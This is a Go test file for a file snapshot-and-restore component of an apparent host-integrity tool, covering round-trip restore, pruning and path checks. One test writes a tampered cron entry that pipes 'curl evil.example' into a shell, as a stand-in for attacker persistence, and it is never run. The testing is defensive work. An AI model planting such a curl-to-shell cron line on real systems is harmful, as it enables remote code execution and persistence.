package actions

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

func skipIfNoCp(t *testing.T) {
	if _, err := exec.LookPath("cp"); err != nil {
		t.Skip("cp not available in this environment")
	}
}

func TestSnapshotCreateAndRestoreRoundTrip(t *testing.T) {
	skipIfNoCp(t)

	watched := t.TempDir()
	snapRoot := t.TempDir()

	cronFile := filepath.Join(watched, "cron.d", "job")
	if err := os.MkdirAll(filepath.Dir(cronFile), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(cronFile, []byte("* * * * * echo original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	s := &Snapshotter{Root: snapRoot, Paths: []string{watched}}

	t1 := time.Now().Add(-time.Hour)
	if _, err := s.Create(t1); err != nil {
		t.Fatalf("Create: %v", err)
	}

	// Attacker tampers with the file after the snapshot.
	if err := os.WriteFile(cronFile, []byte("* * * * * curl evil.example | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	restored, err := s.Restore(cronFile, time.Now())
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if !restored {
		t.Fatal("expected Restore to report a restoration happened")
	}

	got, err := os.ReadFile(cronFile)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "* * * * * echo original\n" {
		t.Errorf("file not restored to snapshot content, got %q", got)
	}
}

func TestSnapshotRestoreNoBaselineReturnsFalseNotError(t *testing.T) {
	skipIfNoCp(t)
	watched := t.TempDir()
	s := &Snapshotter{Root: t.TempDir(), Paths: []string{watched}}

	target := filepath.Join(watched, "f")
	_ = os.WriteFile(target, []byte("x"), 0o644)

	restored, err := s.Restore(target, time.Now())
	if err != nil {
		t.Fatalf("expected no error when there's simply no snapshot yet, got %v", err)
	}
	if restored {
		t.Error("expected restored=false with no snapshot available")
	}
}

func TestSnapshotRestoreRejectsUncoveredPath(t *testing.T) {
	s := &Snapshotter{Root: t.TempDir(), Paths: []string{"/some/watched/root"}}
	if _, err := s.Restore("/totally/different/path", time.Now()); err == nil {
		t.Error("expected rejection for a path outside every watched root")
	}
}

func TestSnapshotPrunesToKeepLimit(t *testing.T) {
	skipIfNoCp(t)
	watched := t.TempDir()
	_ = os.WriteFile(filepath.Join(watched, "f"), []byte("x"), 0o644)

	s := &Snapshotter{Root: t.TempDir(), Paths: []string{watched}, Keep: 2}
	base := time.Now().Add(-time.Hour)
	for i := 0; i < 4; i++ {
		if _, err := s.Create(base.Add(time.Duration(i) * time.Second)); err != nil {
			t.Fatal(err)
		}
	}

	if got := len(s.list()); got != 2 {
		t.Errorf("expected pruning down to 2 snapshots, got %d", got)
	}
}

func TestSnapshotHostRootRoundTrip(t *testing.T) {
	skipIfNoCp(t)
	hostRoot := t.TempDir()
	snapRoot := t.TempDir()
	logicalDir := "/etc/sentinelmesh-test"
	actualDir := filepath.Join(hostRoot, "etc", "sentinelmesh-test")
	if err := os.MkdirAll(actualDir, 0o755); err != nil {
		t.Fatal(err)
	}
	logical := logicalDir + "/config"
	actual := filepath.Join(actualDir, "config")
	if err := os.WriteFile(actual, []byte("good\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	s := &Snapshotter{Root: snapRoot, Paths: []string{logicalDir}, Keep: 4, HostRoot: hostRoot}
	before := time.Now().Add(-time.Hour)
	if _, err := s.Create(before); err != nil {
		t.Fatalf("Create: %v", err)
	}
	if err := os.WriteFile(actual, []byte("bad\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	restored, err := s.Restore(logical, time.Now())
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if !restored {
		t.Fatal("expected restoration")
	}
	got, err := os.ReadFile(actual)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "good\n" {
		t.Fatalf("unexpected restored content %q", got)
	}
}
